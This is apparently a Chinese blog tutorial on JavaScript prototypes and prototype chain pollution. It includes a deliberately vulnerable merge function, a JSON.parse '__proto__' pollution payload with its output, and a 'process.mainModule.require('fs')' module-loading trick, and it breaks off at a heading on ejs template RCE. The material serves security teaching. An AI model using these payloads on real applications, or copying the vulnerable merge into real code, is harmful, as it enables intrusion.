+</span></span><span style="display:flex;"><span>  <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">grade</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">grade</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Student</span>.<span style="color:#58a1dd">prototype</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">Object</span>.<span style="color:#58a1dd">create</span>(<span style="color:#58a1dd">Person</span>.<span style="color:#58a1dd">prototype</span>);<span style="color:#828b96;font-style:italic">//通过 Object.create() 方法，我们将 Student.prototype对象的原型设置为Person.prototype，这样 Student 构造函数的实例就可以访问到 Person 的方法。
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">Student</span>.<span style="color:#58a1dd">prototype</span>.<span style="color:#58a1dd">constructor</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">Student</span>;
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Student</span>.<span style="color:#58a1dd">prototype</span>.<span style="color:#58a1dd">study</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">function</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#a6be9d">`</span><span style="color:#a6be9d">${</span><span style="color:#ff636f">this</span>.<span style="color:#58a1dd">name</span><span style="color:#a6be9d">}</span><span style="color:#a6be9d"> is studying in grade </span><span style="color:#a6be9d">${</span><span style="color:#ff636f">this</span>.<span style="color:#58a1dd">grade</span><span style="color:#a6be9d">}</span><span style="color:#a6be9d">.`</span>);
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">const</span> <span style="color:#58a1dd">john</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Student</span>(<span style="color:#a6be9d">&#39;John&#39;</span>, <span style="color:#a6be9d">5</span>);<span style="color:#828b96;font-style:italic">//在创建 `Student` 实例时，首先调用 `Person.call(this, name)` 来初始化 `Person` 构造函数中定义的属性。然后，通过 `new` 关键字创建一个 `Student` 对象 `john`。
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">john</span>.<span style="color:#58a1dd">greet</span>(); <span style="color:#828b96;font-style:italic">// 输出：Hello, my name is John.
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">john</span>.<span style="color:#58a1dd">study</span>(); <span style="color:#828b96;font-style:italic">// 输出：John is studying in grade 5.
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">john</span> <span style="color:#ff636f">instanceof</span> <span style="color:#58a1dd">Person</span>); <span style="color:#828b96;font-style:italic">// 输出：true
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">john</span> <span style="color:#ff636f">instanceof</span> <span style="color:#58a1dd">Student</span>); <span style="color:#828b96;font-style:italic">// 输出：true
+</span></span></span></code></pre></div><p>最后，我们可以通过 <code>john</code> 对象访问到 <code>Person</code> 和 <code>Student</code> 的方法，并且可以使用 <code>instanceof</code> 运算符检查对象之间的继承关系。</p>
+<h6 id="function与constructor" class="heading-element"><span>0.0.0.1.5  Function与constructor</span>
+  <a href="#function%e4%b8%8econstructor" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>在javascript中，有时会看到大写的Function，这个和小写的function有本质的区别</p>
+<p>function 是一个用于定义函数的关键字。</p>
+<p>Function 是代表所有函数的内置原型对象。</p>
+<p>####### Object.prototype.constructor</p>
+<p>理解Function之前，先补充下constructor的概念。</p>
+<p>constructor是一个对象的数据属性，创建对象后，访问constructor属性，可以返回构造该对象的来源，（不是该对象的原型链上级，二者不同），见下面例子：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">var</span> <span style="color:#58a1dd">a</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">1</span>;
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">a</span>.<span style="color:#58a1dd">__proto__</span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//Number {0, constructor: ƒ, toExponential: ƒ, toFixed: ƒ, toPrecision: ƒ, …}constructor: ƒ Number()toExponential: ƒ toExponential()toFixed: ƒ toFixed()toLocaleString: ƒ toLocaleString()toPrecision: ƒ toPrecision()toString: ƒ toString()valueOf: ƒ valueOf()[[Prototype]]: Object[[PrimitiveValue]]: 0
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">a</span>.<span style="color:#58a1dd">__proto__</span>.<span style="color:#58a1dd">constructor</span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//ƒ Number() { [native code] }
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">a</span>.<span style="color:#58a1dd">constructor</span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//ƒ Number() { [native code] }
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">a</span>.<span style="color:#58a1dd">constructor</span> <span style="color:#ff636f">===</span> <span style="color:#58a1dd">Number</span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//true
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">var</span> <span style="color:#58a1dd">b</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">Number</span>(<span style="color:#a6be9d">1</span>);
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">b</span>.<span style="color:#58a1dd">constructor</span> <span style="color:#ff636f">===</span> <span style="color:#58a1dd">a</span>.<span style="color:#58a1dd">constructor</span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//true
+</span></span></span></code></pre></div><p>上面代码中可以看到一部分constructor的特点：</p>
+<p>1.变量a的原型链的上级是Number对象（a.<strong>proto</strong>）。</p>
+<p>2.Number对象的constructor属性和变量a的constructor属性一样，可见本例的a的原型链的上级和constructor属性是包含关系。</p>
+<p>3.Number对象的constructor属性值是Number方法，通过Number方法构造出的b，与a的属性相同，因为constructor属性，可以返回构造该对象的来源。</p>
+<p>==简单的说constructor属性就是告诉你这个对象从哪来的。==</p>
+<p>####### Function概念</p>
+<p>==每一个javascript的function实际上都是Function对象==，在控制台运行如下，返回True</p>
+<pre tabindex="0"><code>(function () {}).constructor === Function</code></pre><p>Function是javascript内置的对象，Function用以实现很多基本功能，如Number、toString等。</p>
+<ul>
+<li>Function() constructor</li>
+</ul>
+<p>Function()构造器可以创建一个Function对象，可以直接调用Function()构造器动态的创建函数。但是这样会存在类似eval()的安全隐患和一些性能问题。</p>
+<ul>
+<li>eval()和Function()区别：</li>
+</ul>
+<p>eval()可以访问本地的变量、全局变量</p>
+<p>Function()创建函数时只能执行全局变量</p>
+<p>比如eval代码执行时可以这样加载module</p>
+<pre tabindex="0"><code>//eval()
+require(&#39;fs&#39;)</code></pre><p>Function()则需要这样</p>
+<pre tabindex="0"><code>//Function() constructor
+global.process.mainModule.require(&#39;fs&#39;)</code></pre><p>Function() constructor的语法</p>
+<pre tabindex="0"><code>new Function(functionBody)
+new Function(arg0, functionBody)
+new Function(arg0, arg1, functionBody)
+new Function(arg0, arg1, /* … ,*/ argN, functionBody)
+
+Function(functionBody)
+Function(arg0, functionBody)
+Function(arg0, arg1, functionBody)
+Function(arg0, arg1, /* … ,*/ argN, functionBody) 作者：J_Chanra https://www.bilibili.com/read/cv20770194?spm_id_from=333.999.0.0 出处：bilibili</code></pre><h5 id="是什么" class="heading-element"><span>0.0.0.2  是什么</span>
+  <a href="#%e6%98%af%e4%bb%80%e4%b9%88" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>原型链污染最关键的几个词汇就是：merage、verify、copy</p>
+<h6 id="demo1" class="heading-element"><span>0.0.0.2.1  demo1</span>
+  <a href="#demo1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// foo是一个简单的JavaScript对象
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//{bar: 1}表示一个简单的 JavaScript 对象字面量，其中 bar 是属性名，1 是属性值。这个对象字面量可以用来创建一个包含单个属性的对象。
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">let</span> <span style="color:#58a1dd">foo</span> <span style="color:#ff636f">=</span> {<span style="color:#58a1dd">bar</span><span style="color:#ff636f">:</span> <span style="color:#a6be9d">1</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// foo.bar 此时为1
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">foo</span>.<span style="color:#58a1dd">bar</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// 修改foo的原型（即Object）
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">foo</span>.<span style="color:#58a1dd">__proto__</span>.<span style="color:#58a1dd">bar</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// 由于查找顺序的原因，foo.bar仍然是1
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">foo</span>.<span style="color:#58a1dd">bar</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// 此时再用Object创建一个空的zoo对象
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">let</span> <span style="color:#58a1dd">zoo</span> <span style="color:#ff636f">=</span> {}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// 查看zoo.bar
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">zoo</span>.<span style="color:#58a1dd">bar</span>)</span></span></code></pre></div><p>这个语句到最后 zoo.bar 的结果 是2 虽然zoo是一个 空对象</p>
+<p>而这个的原因也就是 在前面我们修改foo的原型 foo.<strong>proto</strong>.bar =2 而 foo是一个 Object类的实例 所以 实际上是修改了Object这个类 给这个类增加了一个属性bar 值为2</p>
+<p>后来 我们又用 Object类 创建了一个 zoo对象 那么 这个zoo对象 自然也有一个bar属性了</p>
+<p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307290022540.webp" alt="image-20230729002254976" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307290022540.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307290022540.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307290022540.webp?size=large 2x" data-title="image-20230729002254976" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h6 id="demo2" class="heading-element"><span>0.0.0.2.2  demo2</span>
+  <a href="#demo2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//所有的对象都继承自Object.prototype，包括{ “a”: 1, “b”: 2 }这样的对象。
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">object1</span> <span style="color:#ff636f">=</span> {<span style="color:#a6be9d">&#34;a&#34;</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">1</span>, <span style="color:#a6be9d">&#34;b&#34;</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">2</span>};
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">object1</span>.<span style="color:#58a1dd">__proto__</span>.<span style="color:#58a1dd">foo</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;Hello World&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">object1</span>.<span style="color:#58a1dd">foo</span>);
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">object2</span> <span style="color:#ff636f">=</span> {<span style="color:#a6be9d">&#34;c&#34;</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">1</span>, <span style="color:#a6be9d">&#34;d&#34;</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">2</span>};
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">object2</span>.<span style="color:#58a1dd">foo</span>);</span></span></code></pre></div><p>o1 和 o2 相当于继承了Object.prototype 所以当我们对一个对象设置foo属性 就造成了原型链污染 导致Object2 也拥有了foo属性</p>
+<h5 id="产生原因" class="heading-element"><span>0.0.0.3  产生原因</span>
+  <a href="#%e4%ba%a7%e7%94%9f%e5%8e%9f%e5%9b%a0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>如果 我们需要利用原型链污染 那我们就需要设置 <strong><code>__proto__</code></strong> 的值 也就是需要找到能控制数组的键名的操作 最常见的就是merge clone copy</p>
+<p><code>merge</code>方法 是合并对象的方法 合并两个对象或者 多个对象的属性</p>
+<p><code>clone</code>方法 就是克隆捏</p>
+<p>这里的merge换成copy也是污染</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">function</span> <span style="color:#58a1dd">merge</span>(<span style="color:#58a1dd">target</span>, <span style="color:#58a1dd">source</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">for</span> (<span style="color:#ff636f">let</span> <span style="color:#58a1dd">key</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">source</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">key</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">source</span> <span style="color:#ff636f">&amp;&amp;</span> <span style="color:#58a1dd">key</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">target</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">merge</span>(<span style="color:#58a1dd">target</span>[<span style="color:#58a1dd">key</span>], <span style="color:#58a1dd">source</span>[<span style="color:#58a1dd">key</span>])
+</span></span><span style="display:flex;"><span>        } <span style="color:#ff636f">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">target</span>[<span style="color:#58a1dd">key</span>] <span style="color:#ff636f">=</span> <span style="color:#58a1dd">source</span>[<span style="color:#58a1dd">key</span>]
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>在合并的过程中 存在赋值的操作 target[key] = source[key] 那么 这个key如果是 <strong>proto</strong>是不是就可以进行原型链污染</p>
+<p>我们用如下代码试一下啊</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">let</span> <span style="color:#58a1dd">o1</span> <span style="color:#ff636f">=</span> {}
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">let</span> <span style="color:#58a1dd">o2</span> <span style="color:#ff636f">=</span> {<span style="color:#58a1dd">a</span><span style="color:#ff636f">:</span> <span style="color:#a6be9d">1</span>, <span style="color:#a6be9d">&#34;__proto__&#34;</span><span style="color:#ff636f">:</span> {<span style="color:#58a1dd">b</span><span style="color:#ff636f">:</span> <span style="color:#a6be9d">2</span>}}
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">o1</span>.<span style="color:#58a1dd">a</span>, <span style="color:#58a1dd">o1</span>.<span style="color:#58a1dd">b</span>)
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">merge</span>(<span style="color:#58a1dd">o1</span>, <span style="color:#58a1dd">o2</span>)
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">o1</span>.<span style="color:#58a1dd">a</span>, <span style="color:#58a1dd">o1</span>.<span style="color:#58a1dd">b</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">o3</span> <span style="color:#ff636f">=</span> {}
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">o3</span>.<span style="color:#58a1dd">b</span>)<span style="color:#828b96;font-style:italic">//重点在观察o3是否污染
+</span></span></span></code></pre></div><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307292158010.webp" alt="image-20230729215853695" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307292158010.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307292158010.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307292158010.webp?size=large 2x" data-title="image-20230729215853695" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>可以看到 这样写 并没有进行污染 但是 二者合并了</p>
+<p>这是因为 我们用JavaScript 创建o2的过程<code>{a: 1, &quot;__proto__&quot;: {b: 2}}</code> 中 <strong>proto</strong>已经代表o2的原型了 此时 遍历 o2所有键名 你拿到的是[a,b] <strong>proto</strong>并不是一个key 自然 也不会修改 Object的原型</p>
+<p>那么 我们的任务就变成了 让<strong>proto</strong> 被认为是一个 键名</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">function</span> <span style="color:#58a1dd">merge</span>(<span style="color:#58a1dd">target</span>, <span style="color:#58a1dd">source</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">for</span> (<span style="color:#ff636f">let</span> <span style="color:#58a1dd">key</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">source</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">key</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">source</span> <span style="color:#ff636f">&amp;&amp;</span> <span style="color:#58a1dd">key</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">target</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">merge</span>(<span style="color:#58a1dd">target</span>[<span style="color:#58a1dd">key</span>], <span style="color:#58a1dd">source</span>[<span style="color:#58a1dd">key</span>])
+</span></span><span style="display:flex;"><span>        } <span style="color:#ff636f">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">target</span>[<span style="color:#58a1dd">key</span>] <span style="color:#ff636f">=</span> <span style="color:#58a1dd">source</span>[<span style="color:#58a1dd">key</span>]
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">let</span> <span style="color:#58a1dd">o1</span> <span style="color:#ff636f">=</span> {}
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">let</span> <span style="color:#58a1dd">o2</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">JSON</span>.<span style="color:#58a1dd">parse</span>(<span style="color:#a6be9d">&#39;{&#34;a&#34;: 1, &#34;__proto__&#34;: {&#34;b&#34;: 2}}&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">merge</span>(<span style="color:#58a1dd">o1</span>, <span style="color:#58a1dd">o2</span>)
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">o1</span>.<span style="color:#58a1dd">a</span>, <span style="color:#58a1dd">o1</span>.<span style="color:#58a1dd">b</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">o3</span> <span style="color:#ff636f">=</span> {}
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">o3</span>.<span style="color:#58a1dd">b</span>)
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">o3</span>.<span style="color:#58a1dd">a</span>)
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">最终输出</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">1</span> <span style="color:#a6be9d">2</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">2</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">undefined</span></span></span></code></pre></div><p>向上面这么写 最后会完成污染 这是因为 json解析的时候 <strong>proto</strong>会被认为成一个真正的键名 而不代表原型 所以在遍历o2的时候 会存在这个键。ps:前面用的<code>let o2 = {a: 1, &quot;__proto__&quot;: {b: 2}}</code></p>
+<p>但是 我们输出a 为undefined，上面o1 o2 输出a为1 是因为 merge对二者进行了融合 但是并没有进行污染</p>
+<p>这里也能比较清晰的认识到污染</p>
+<h5 id="漏洞利用" class="heading-element"><span>0.0.0.4  漏洞利用</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><h6 id="ejs模板rce" class="heading-element"><span>0.0.0.4.1  ejs模板rce</span>
+  <a href="#ejs%e6%a8%a1%e6%9d%bfrce" class="heading-mark">
